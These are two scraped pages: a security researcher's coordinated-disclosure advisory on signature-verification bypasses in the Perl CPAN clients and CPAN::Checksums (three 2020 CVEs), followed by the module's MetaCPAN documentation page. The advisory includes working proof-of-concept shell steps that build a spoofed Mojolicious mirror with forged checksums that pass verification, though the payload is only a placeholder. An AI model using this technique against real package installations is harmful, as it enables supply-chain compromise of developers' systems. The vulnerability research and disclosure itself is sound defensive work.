=== Content from blog.hackeriet.no_2b3fa77a_20250119_124623.html ===

[![](/images/hackeriet-logo.png)](/)
# [Hackeriet Blog](/)

Ikke akkurat NRK Beta

[About](http://hackeriet.no/)

# Signature Verification Vulnerabilities in CPAN.pm, cpanminus and CPAN::Checksums

23/11/21 â sgo

[CPAN](https://www.cpan.org/) is a repository of over 200,000 modules for the
Perl programming language. [PAUSE](https://pause.cpan.org/) is the â[Perl
programming] Authors Upload Serverâ.

To install Perl modules from CPAN, users can use the `cpan` client provided by
[CPAN.pm](https://metacpan.org/dist/CPAN) included in the Perl core,
or the `cpanm` client provided by
[cpanminus](https://metacpan.org/pod/App%3A%3Acpanminus).

Both clients have optional support for verifying that `CHECKSUMS` files have a
valid PAUSE PGP signature before checksums are checked and modules are installed.

It was found that `cpan` and `cpanm` are vulnerable to a signature verification
bypass. Additionally, `CPAN::Checksums` (used by PAUSE) does not uniquely
identify packages in the signed `CHECKSUMS` file, enabling a supply chain
attack.

* [CVE-2020-16154] App::cpanminus 1.7044 allows Signature Verification Bypass
* [CVE-2020-16155] CPAN::Checksums 2.12 does not uniquely define signed data.
* [CVE-2020-16156] CPAN 2.28 allows Signature Verification Bypass

For more information see [Addressing CPAN vulnerabilities related to checksums](http://blogs.perl.org/users/neilb/2021/11/addressing-cpan-vulnerabilities-related-to-checksums.html) by Neil Bowers.

# Mitigation

Users should ensure that their CPAN client is configured to use a trusted TLS
(https) protected mirror as signature verification can be bypassed, and signed
`CHECKSUMS` cannot be relied upon for security.

# Signature Verification Bypass

[CVE-2020-16154, CVE-2020-16156]

An attacker can prepend checksums for modified packages to the beginning of
`CHECKSUMS` files, before the cleartext PGP headers. This makes the
`Module::Signature::_verify()` checks in both `cpan` and `cpanm` pass.

Without the `sigtext` and `plaintext` arguments to `_verify()`, the `_compare()`
check is bypassed. This results in `_verify()` only checking that valid signed
cleartext is present somewhere in the file.

## Proof of Concept

First, `Module::Signature` needs to be installed. Then prepare a malicious CPAN
mirror containing a modified package.

In this example, we spoofed the popular `Mojolicious` package to illustrate:

```
mkdir -p cpan/{authors,modules}
wget -O cpan/authors/01mailrc.txt.gz https://cpan.metacpan.org/authors/01mailrc.txt.gz
wget -O cpan/modules/02packages.details.txt.gz https://cpan.metacpan.org/modules/02packages.details.txt.gz
wget -O cpan/modules/03modlist.data.gz https://cpan.metacpan.org/modules/03modlist.data.gz
mkdir -p cpan/authors/id/S/SR/SRI
pushd cpan/authors/id/S/SR/SRI
wget -O CHECKSUMS_ORIG https://cpan.metacpan.org/authors/id/S/SR/SRI/CHECKSUMS
module=Mojolicious-8.56
mkdir $module
echo 'print "### INSERT MALICIOUS CODE HERE ###\n";' > $module/Makefile.PL
tar czf $module.tar.gz $module
sha256=$(sha256sum $module.tar.gz | cut -d' ' -f1)
(echo -en "\$chksum = { '$module.tar.gz' => { sha256 => '$sha256'} };\n__END__\n"; cat CHECKSUMS_ORIG) > CHECKSUMS
popd
cd cpan
# Then serve the repo locally on port 8000
busybox httpd -f -p 8000

```
### CPAN.pm

Prepare environment:

* Install the required signature checker extension
* Add http://localhost:8000 to your `urllist`
* enable `check_sigs`.

```
$ cpan Module::Signature
$ cat <<EOF |cpan
o conf check_sigs 1
o conf urllist unshift http://localhost:8000
o conf commit
EOF

```

Demonstrate unsigned code execution:

```
$ cpan SRI/Mojolicious-8.56.tar.gz
[..]
Signature for /home/user/.cpan/sources/authors/id/S/SR/SRI/CHECKSUMS ok
Checksum for /home/user/.cpan/sources/authors/id/S/SR/SRI/Mojolicious-8.56.tar.gz ok
[..]
Configuring S/SR/SRI/Mojolicious-8.56.tar.gz with Makefile.PL
### INSERT MALICIOUS CODE HERE ###
No 'Makefile' created  SRI/Mojolicious-8.56.tar.gz
  /nix/store/kfrlhcjp3hp7vs83y701xzd542k8sm7k-perl-5.30.3/bin/perl Makefile.PL -- NOT OK

```
### App::cpanminus

```
$ cpanm --local-lib=$(mktemp -d) -v --verify --mirror http://localhost:8000/ Mojolicious@8.56
[..]
Verifying the signature of CHECKSUMS
Verified OK!
Verifying the SHA1 for Mojolicious-8.56.tar.gz
Checksum for Mojolicious-8.56.tar.gz: Verified!
Unpacking Mojolicious-8.56.tar.gz
[..]
Running Makefile.PL
Configuring Mojolicious-8.56 ... ### INSERT MALICIOUS CODE HERE ###
N/A
! Configure failed for Mojolicious-8.56. See /home/user/.cpanm/work/1596121570.28866/build.log for details.

```
# CPAN::Checksums does not uniquely define signed data

[CVE-2020-16155]

`CPAN::Checksums` generates `CHECKSUMS` recursively for each directory under the
`author/` directory structure, and the file path for the packages in the
manifest doesnât contain an author handle (filenames are only unique per
author).

An attacker with PAUSE access can trick PAUSE into generating a valid
`CHECKSUMS` file for another authors package, allowing a malicious mirror or
network attacker to serve a modified package to a target along with a valid but
malicious `CHECKSUMS` file.

## Proof of Concept

A `CHECKSUMS` file impersonating the already published package
`Acme::Study::Perl 0.0.1` has been generated on `pause.cpan.org` and signed by
the PAUSE PGP key.

```
0&&<<''; # this PGP-signed message is also valid perl
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

# CHECKSUMS file written on Fri Jul 24 15:59:10 2020 GMT by CPAN::Checksums (v2.12)
$cksum = {
  'Acme-Study-Perl-0.0.1.tar.gz' => {
    'md5' => 'd474ea9bf1861d696f05fbfc9e845f77',
    'md5-ungz' => '9614de46e57904130b6f75c0fe8fdd22',
    'mtime' => '2020-07-24',
    'sha256' => 'f239031b672604dafe456909ba3121f0c002e135bbc394fafd072397ecfadc99',
    'sha256-ungz' => 'cef212349a6beb0622193e22d92a21dc9dd7bb2f6d7f79ac0d863188efef0282',
    'size' => 211
  },
  'test.txt' => {
    'md5' => '5150d35ce48639c7c78cffe84891faab',
    'mtime' => '2020-07-24',
    'sha256' => '5d0d196ae349adf45246252d303885db3adfa723139ad5147fe7a767ded1f5b4',
    'size' => 51
  }
};
__END__
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.14 (GNU/Linux)

iEYEARECAAYFAl8bBU4ACgkQMo2oZ0UPiewySQCfd00WKH3QfVO/GjcYvDosimBs
44AAoJZGxbOludHf6JYItrNOSBq1BHVA
=6gsJ
-----END PGP SIGNATURE-----

```
# Timeline

* 2020-07-08: The Perl Security team was notified
* 2020-07-15: The module authors were notified
* 2020-07-30: CVE numbers assigned
* 2021-11-18: Publication agreed for 23 nov
* 2021-11-23: Coordinated disclosure

# References

* <http://blogs.perl.org/users/neilb/2021/11/addressing-cpan-vulnerabilities-related-to-checksums.html>
* <https://github.com/andk/cpan-checksums>
* <https://github.com/andk/cpanpm/blob/ac0963601fe22c3a0b6cc9a8f0d51da5fd6e41ef/lib/CPAN/Distribution.pm#L1474>
* <https://github.com/miyagawa/cpanminus/blob/7b574ede70cebce3709743ec1727f90d745e8580/Menlo-Legacy/lib/Menlo/CLI/Compat.pm#L1491>

# Acknowledgements

Thanks to Andreas KÃ¶nig, Neil Bowers, Hamish Coleman, Alexander KjÃ¤ll and Salve J. Nilsen.

Authored by Stig Palmquist



=== Content from metacpan.org_3cdebc69_20250119_124623.html ===


* [About](/about)
* [Sponsor](/about/sponsors)
* [grep::cpan](https://grep.metacpan.org/)
* [Recent](/recent)
* [FAQ](/about/faq)
* [Tools](/tools)
* [API](https://fastapi.metacpan.org/)

* + [Identities](/account/identities)
  + [Profile](/account/profile)
  + [Favorites](/account/favorite/list)
  + Logout
* + [GitHub](/login/github)
  + [Twitter](/login/twitter)
  + [Google](/login/google)

* 04 Dec 2021 10:00:42 UTC
* Distribution: [CPAN-Checksums](/dist/CPAN-Checksums)
* Module version: 2.14
* [Source](/dist/CPAN-Checksums/source/lib/CPAN/Checksums.pm)
  ([raw](/dist/CPAN-Checksums/source/lib/CPAN/Checksums.pm?raw=1))
* [Browse](/dist/CPAN-Checksums/source/lib/CPAN)
  ([raw](/dist/CPAN-Checksums/source/lib/CPAN?raw=1))
* [Changes](/dist/CPAN-Checksums/changes)
* [How to Contribute](/dist/CPAN-Checksums/contribute)
* [Repository](https://github.com/andk/cpan-checksums)
* [Issues](https://rt.cpan.org/Public/Dist/Display.html?Name=CPAN-Checksums)
  (1)
* [Testers](http://matrix.cpantesters.org/?dist=CPAN-Checksums+2.14 "Matrix")
  ([1971](https://www.cpantesters.org/distro/C/CPAN-Checksums.html?oncpan=1&distmat=1&version=2.14&grade=2) / [31](https://www.cpantesters.org/distro/C/CPAN-Checksums.html?oncpan=1&distmat=1&version=2.14&grade=3) / [0](https://www.cpantesters.org/distro/C/CPAN-Checksums.html?oncpan=1&distmat=1&version=2.14&grade=4))
* [Kwalitee](http://cpants.cpanauthors.org/release/ANDK/CPAN-Checksums-2.14)
* Bus factor: 1
* [69.37% Coverage](http://cpancover.com/latest/CPAN-Checksums-2.14/index.html)
* License: perl\_5
* Activity
* ![](/dist/CPAN-Checksums/activity.svg?res=month)
  24 month
* Tools
* [Download (15.66KB)](https://cpan.metacpan.org/authors/id/A/AN/ANDK/CPAN-Checksums-2.14.tar.gz)
* [MetaCPAN Explorer](https://explorer.metacpan.org/?url=%2Fmodule%2FANDK%2FCPAN-Checksums-2.14%2Flib%2FCPAN%2FChecksums.pm)
* [Permissions](/dist/CPAN-Checksums/permissions)
* [Subscribe to distribution](/dist/CPAN-Checksums/releases.rss)
* Install Instructions
* Jump to version
  2.14
  (ANDK on 2021-12-04)
  2.13
  (ANDK on 2021-11-23)
  '
  2.12
  (ANDK on 2016-06-14)
  2.11
  (ANDK on 2016-04-09)
  2.10
  (ANDK on 2015-04-11)
  2.09
  (ANDK on 2014-04-04)
  2.08
  (ANDK on 2011-08-30)
  2.07
  (ANDK on 2010-11-20)
  2.06
  (ANDK on 2010-10-24)
  2.05
  (ANDK on 2010-01-23)
  2.04
  (ANDK on 2009-09-28)
  2.03
  (ANDK on 2009-09-20)
  2.02
  (ANDK on 2008-10-31)
  2.01
  (ANDK on 2008-09-03)
  2.00
  (ANDK on 2008-05-17)
  1.064
  (ANDK on 2007-10-09)
  1.061
  (ANDK on 2007-08-05)
  1.050
  (ANDK on 2006-05-09)
  1.048
  (ANDK on 2006-05-01)
  1.039
  (ANDK on 2005-11-11)
  1.032
  (ANDK on 2005-10-31)
  1.018
  (ANDK on 2005-01-24)
  1.016
  (ANDK on 2003-02-03)
  1.015
  (ANDK on 2003-02-03)
  1.014
  (ANDK on 2003-02-02)
  1.011
  (ANDK on 2002-10-07)
  1.0
  (ANDK on 2002-10-06)
  1.009
  (ANDK on 2002-03-31)
  1.008
  (ANDK on 2000-12-13)
  1.007
  (ANDK on 2000-12-11)
  1.006
  (ANDK on 2000-12-11)
  1.004
  (ANDK on 2000-12-11)
  1.003
  (ANDK on 2000-12-10)
* Diff with version
  2.14
  (ANDK on 2021-12-04)
  2.13
  (ANDK on 2021-11-23)
  '
  2.12
  (ANDK on 2016-06-14)
  2.11
  (ANDK on 2016-04-09)
  2.10
  (ANDK on 2015-04-11)
  2.09
  (ANDK on 2014-04-04)
  2.08
  (ANDK on 2011-08-30)
  2.07
  (ANDK on 2010-11-20)
  2.06
  (ANDK on 2010-10-24)
  2.05
  (ANDK on 2010-01-23)
  2.04
  (ANDK on 2009-09-28)
  2.03
  (ANDK on 2009-09-20)
  2.02
  (ANDK on 2008-10-31)
  2.01
  (ANDK on 2008-09-03)
  2.00
  (ANDK on 2008-05-17)
  1.064
  (ANDK on 2007-10-09)
  1.061
  (ANDK on 2007-08-05)
  1.050
  (ANDK on 2006-05-09)
  1.048
  (ANDK on 2006-05-01)
  1.039
  (ANDK on 2005-11-11)
  1.032
  (ANDK on 2005-10-31)
  1.018
  (ANDK on 2005-01-24)
  1.016
  (ANDK on 2003-02-03)
  1.015
  (ANDK on 2003-02-03)
  1.014
  (ANDK on 2003-02-02)
  1.011
  (ANDK on 2002-10-07)
  1.0
  (ANDK on 2002-10-06)
  1.009
  (ANDK on 2002-03-31)
  1.008
  (ANDK on 2000-12-13)
  1.007
  (ANDK on 2000-12-11)
  1.006
  (ANDK on 2000-12-11)
  1.004
  (ANDK on 2000-12-11)
  1.003
  (ANDK on 2000-12-10)
* + Dependencies
  + [Compress::Bzip2](/pod/Compress%3A%3ABzip2 "Compress::Bzip2")
  + [Compress::Zlib](/pod/Compress%3A%3AZlib "Compress::Zlib")
  + [Data::Compare](/pod/Data%3A%3ACompare "Data::Compare")
  + [Data::Dumper](/pod/Data%3A%3ADumper "Data::Dumper")
  + [Digest::MD5](/pod/Digest%3A%3AMD5 "Digest::MD5")
  + [Digest::SHA](/pod/Digest%3A%3ASHA "Digest::SHA")
  + [DirHandle](/pod/DirHandle "DirHandle")
  + [File::Spec](/pod/File%3A%3ASpec "File::Spec")
  + [File::Temp](/pod/File%3A%3ATemp "File::Temp")
  + [IO::File](/pod/IO%3A%3AFile "IO::File")
  + [Module::Signature](/pod/Module%3A%3ASignature "Module::Signature")
  + *and possibly others*
  + ---
  + [Reverse dependencies](/module/CPAN%3A%3AChecksums/requires)
  + [CPAN Testers List](http://deps.cpantesters.org/?module=CPAN%3A%3AChecksums)
  + [Dependency graph](https://cpandeps.grinnz.com/?dist=CPAN-Checksums)
* Permalinks
* [This version](/release/ANDK/CPAN-Checksums-2.14/view/lib/CPAN/Checksums.pm)
* [Latest version](/pod/CPAN%3A%3AChecksums)

[Andreas J. König](/author/ANDK)

 /

2.14
(ANDK on 2021-12-04)
2.13
(ANDK on 2021-11-23)
'
2.12
(ANDK on 2016-06-14)
2.11
(ANDK on 2016-04-09)
2.10
(ANDK on 2015-04-11)
2.09
(ANDK on 2014-04-04)
2.08
(ANDK on 2011-08-30)
2.07
(ANDK on 2010-11-20)
2.06
(ANDK on 2010-10-24)
2.05
(ANDK on 2010-01-23)
2.04
(ANDK on 2009-09-28)
2.03
(ANDK on 2009-09-20)
2.02
(ANDK on 2008-10-31)
2.01
(ANDK on 2008-09-03)
2.00
(ANDK on 2008-05-17)
1.064
(ANDK on 2007-10-09)
1.061
(ANDK on 2007-08-05)
1.050
(ANDK on 2006-05-09)
1.048
(ANDK on 2006-05-01)
1.039
(ANDK on 2005-11-11)
1.032
(ANDK on 2005-10-31)
1.018
(ANDK on 2005-01-24)
1.016
(ANDK on 2003-02-03)
1.015
(ANDK on 2003-02-03)
1.014
(ANDK on 2003-02-02)
1.011
(ANDK on 2002-10-07)
1.0
(ANDK on 2002-10-06)
1.009
(ANDK on 2002-03-31)
1.008
(ANDK on 2000-12-13)
1.007
(ANDK on 2000-12-11)
1.006
(ANDK on 2000-12-11)
1.004
(ANDK on 2000-12-11)
1.003
(ANDK on 2000-12-10)

[CPAN-Checksums-2.14](/dist/CPAN-Checksums)

 River stage three
• 9 direct dependents
• 480 total dependents

 ++

 ++

/ CPAN::Checksums

**Contents**

* [NAME](#NAME)
* [SYNOPSIS](#SYNOPSIS)
* [INCOMPATIBILITY ALERT](#INCOMPATIBILITY-ALERT)
* [DESCRIPTION](#DESCRIPTION)
  + [Global Variables in package CPAN::Checksums](#Global-Variables-in-package-CPAN%3A%3AChecksums)
* [PREREQUISITES](#PREREQUISITES)
* [BUGS](#BUGS)
* [AUTHOR](#AUTHOR)
* [COPYRIGHT & LICENSE](#COPYRIGHT-%26-LICENSE)
* [SEE ALSO](#SEE-ALSO)

# NAME

CPAN::Checksums - Write a `CHECKSUMS` file for a directory as on CPAN

# SYNOPSIS

```
use CPAN::Checksums qw(updatedir);
my $success = updatedir($directory, $root);
```
# INCOMPATIBILITY ALERT

Since version 1.0 the generation of the attribute `shortname` is turned off by default. It was too slow and was not used as far as I know, and above all, it could fail on large directories. The shortname feature can still be turned on by setting the global variable $TRY\_SHORTNAME to a true value.

# DESCRIPTION

$success = updatedir($dir[, $root])

$dir is a directory. Updatedir() writes a `CHECKSUMS` file into that directory, unless a previously written `CHECKSUMS` file is there that is still valid. Returns 2 if a new `CHECKSUMS` file has been written, 1 if a valid `CHECKSUMS` file is already there, otherwise dies.

If $root is given, the hash entry with the key `cpan_path` is relative to this root directory.

Note: since version 2.0 updatedir on empty directories behaves just the same. In older versions it silently did nothing.

## Global Variables in package CPAN::Checksums

$IGNORE\_MATCH

If the global variable $IGNORE\_MATCH is set, then all files matching this expression will be completely ignored and will not be included in the CPAN `CHECKSUMS` files. Per default this variable is set to

```
qr{(?i-xsm:readme$)}
```

$CAUTION

Setting the global variable $CAUTION causes updatedir() to report changes of files in the attributes `size`, `mtime`, `md5`, or `md5-ungz` to STDERR.

$TRY\_SHORTNAME

By setting the global variable $TRY\_SHORTNAME to a true value, you can tell updatedir() to include an attribute `shortname` in the resulting hash that is 8.3-compatible. Please note, that updatedir() in this case may be slow and may even fail on large directories, because it will always only try 1000 iterations to find a name that is not yet taken and then give up.

$SIGNING\_KEY

Setting the global variable $SIGNING\_KEY makes the generated `CHECKSUMS` file to be clear-signed by the command specified in $SIGNING\_PROGRAM (defaults to `gpg --clearsign --default-key` ), passing the signing key as an extra argument. The resulting `CHECKSUMS` file should look like:

```
    0&&<<''; # this PGP-signed message is also valid perl
    -----BEGIN PGP SIGNED MESSAGE-----
    Hash: SHA1

    # CHECKSUMS file written on ... by CPAN::Checksums (v...)
    $cksum = {
	...
    };

    __END__
    -----BEGIN PGP SIGNATURE-----
    ...
    -----END PGP SIGNATURE-----
```

note that the actual data remains intact, but two extra lines are added to make it legal for both OpenPGP and perl syntax.

$MIN\_MTIME\_CHECKSUMS

If the global variable $MIN\_MTIME\_CHECKSUMS is set, then updatedir will renew signatures on checksum files that have an older mtime than the given value.

# PREREQUISITES

DirHandle, IO::File, Digest::MD5, Digest::SHA, Compress::Bzip2, Compress::Zlib, File::Spec, Data::Dumper, Data::Compare, File::Temp

# BUGS

If updatedir is interrupted, it may leave a temporary file lying around. These files have the File::Temp template `CHECKSUMS.XXXX` and should be harvested by a cronjob.

# AUTHOR

Andreas Koenig, andreas.koenig@anima.de; GnuPG support by Autrijus Tang

# COPYRIGHT & LICENSE

Copyright (c) 2002-2008 Andreas Koenig, Audrey Tang, Steve Peters.

This program is free software; you can redistribute it and/or modify it under the same terms as Perl itself.

# SEE ALSO

perl(1).

×
#### Module Install Instructions

To install CPAN::Checksums, copy and paste the appropriate command in to your terminal.

[cpanm](/dist/App-cpanminus/view/bin/cpanm)

```
cpanm CPAN::Checksums
```

[CPAN shell](/pod/CPAN)

```
perl -MCPAN -e shell
install CPAN::Checksums
```

For more information on module installation, please visit [the detailed CPAN module installation guide](https://www.cpan.org/modules/INSTALL.html).

Close

[![MetaCPAN](/static/images/metacpan-logo.svg)](/)

[About](/about)

[Sponsor](/about/sponsors)

[grep::cpan](https://grep.metacpan.org)

[Recent](/recent)

[FAQ](/about/faq)

[Tools](/tools)

[API](https://fastapi.metacpan.org/)

[Perl.org](https://www.perl.org/)

[![Bytemark logo](/static/images/sponsors/bytemark_logo.svg)](https://www.bytemark.co.uk/)
[![liquidweb logo](/static/images/sponsors/liquidweb_logo.png)](https://www.liquidweb.com/)
[![Deriv logo](/static/images/sponsors/deriv.svg)](https://deriv.com/careers/)
[![Geocode logo](/static/images/sponsors/geocodelogo.svg)](https://geocode.xyz)
[![Fastly logo](/static/images/sponsors/fastly_logo.svg)](https://www.fastly.com/)
[![OpenCage logo](/static/images/sponsors/open-cage.svg)](https://opencagedata.com)

[![Elastic logo](/static/images/sponsors/elastic.svg)](https://www.elastic.co/)

[![Route4Me logo](/static/images/sponsors/route4me.png)](https://route4me.com/)

×
#### Keyboard Shortcuts

|  | Global |
| --- | --- |
| `s` | Focus search bar |
| `?` | Bring up this help dialog |

|  | GitHub |
| --- | --- |
| `g` `p` | Go to pull requests |
| `g` `i` | go to github issues (only if github is preferred repository) |

|  | POD |
| --- | --- |
| `g` `a` | Go to author |
| `g` `c` | Go to changes |
| `g` `i` | Go to issues |
| `g` `d` | Go to dist |
| `g` `r` | Go to repository/SCM |
| `g` `s` | Go to source |
| `g` `b` | Go to file browse |

|  | Search terms |
| --- | --- |
| *module:* (e.g. [module:Plugin](/search?q=module%3APlugin)) |
| *distribution:* (e.g. [distribution:Dancer auth](/search?q=distribution%3ADancer+auth)) |
| *author:* (e.g. [author:SONGMU Redis](/search?q=author%3ASONGMU+Redis)) |
| *version:* (e.g. [version:1.00](/search?q=version%3A1.00)) |


